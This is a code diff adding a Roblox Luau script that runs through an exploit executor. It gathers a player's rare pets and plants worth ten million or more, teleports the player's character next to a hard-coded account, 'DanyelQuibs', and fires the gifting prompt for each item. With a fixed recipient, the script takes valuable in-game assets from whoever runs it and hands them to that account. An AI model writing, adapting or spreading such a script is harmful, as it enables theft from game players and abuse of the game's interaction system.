@@ -1,0 +1,121 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- Settings
+local targetUsername = "DanyelQuibs" -- change to the recipient's username
+local minValue = 10000000
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+
+-- Modules
+local modules = ReplicatedStorage:WaitForChild("Modules")
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local dataService = require(modules:WaitForChild("DataService"))
+
+-- Helpers
+local function getWeight(tool)
+	local match = tool.Name:match("%[(%d+%.?%d*) KG%]")
+	return tonumber(match) or 0
+end
+
+local function calcPetValue(petData)
+	local hatchedFrom = petData.PetData.HatchedFrom
+	if not hatchedFrom then return 0 end
+	local eggData = petRegistry.PetEggs[hatchedFrom]
+	if not eggData then return 0 end
+	local rarity = eggData.RarityData.Items[petData.PetType]
+	if not rarity then return 0 end
+	local range = rarity.GeneratedPetData.WeightRange
+	if not range then return 0 end
+	local baseWeight = petData.PetData.BaseWeight
+	local lerpFactor = (baseWeight - range[1]) / (range[2] - range[1])
+	local weightModifier = math.lerp(0.8, 1.2, lerpFactor)
+	local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
+	local multiplier = math.lerp(0.15, 6, levelProgress)
+	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightModifier * multiplier)
+end
+
+-- Step 1: Gather items
+local itemsToGift = {}
+
+for _, tool in ipairs(backpack:GetChildren()) do
+	if not tool:IsA("Tool") or table.find(excludedItems, tool.Name) then continue end
+
+	if tool:GetAttribute("ItemType") == "Pet" then
+		local petUUID = tool:GetAttribute("PET_UUID")
+		local petData = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+		local name = petData.PetType
+		local value = calcPetValue(petData)
+		local weight = getWeight(tool)
+
+		if table.find(rarePets, name) or weight >= 10 then
+			table.insert(itemsToGift, {Tool = tool, Name = name, Type = "Pet"})
+		end
+	else
+		local value = calcPlantValue(tool)
+		if value >= minValue then
+			local name = tool:GetAttribute("ItemName") or tool.Name
+			table.insert(itemsToGift, {Tool = tool, Name = name, Type = "Plant"})
+		end
+	end
+end
+
+-- Step 2: Auto-gift if target is found
+local function giftToTarget(targetPlayer)
+	local rootPart = character:WaitForChild("HumanoidRootPart")
+	local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+	if not targetRoot then
+		warn("Target has no character loaded.")
+		return
+	end
+
+	-- move closer
+	rootPart.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
+	wait(0.5)
+
+	for _, item in ipairs(itemsToGift) do
+		item.Tool.Parent = character
+		task.wait(0.2)
+
+		local prompt = if item.Type == "Pet"
+			then targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
+			else targetPlayer.Character.HumanoidRootPart:FindFirstChild("ProximityPrompt")
+
+		if prompt and prompt.Enabled then
+			fireproximityprompt(prompt)
+			task.wait(0.3)
+		else
+			warn("Prompt not found or disabled for item:", item.Name)
+		end
+
+		item.Tool.Parent = backpack
+		task.wait(0.2)
+	end
+
+	print("✅ Gifting complete.")
+end
+
+local function waitForTarget()
+	local target = Players:FindFirstChild(targetUsername)
+	if target and target.Character then
+		giftToTarget(target)
+	else
+		print("⏳ Waiting for target:", targetUsername)
+		Players.PlayerAdded:Connect(function(p)
+			if p.Name == targetUsername then
+				p.CharacterAdded:Wait()
+				task.wait(1)
+				giftToTarget(p)
+			end
+		end)
+	end
+end
+
+-- ✅ Auto-start gifting
+waitForTarget()
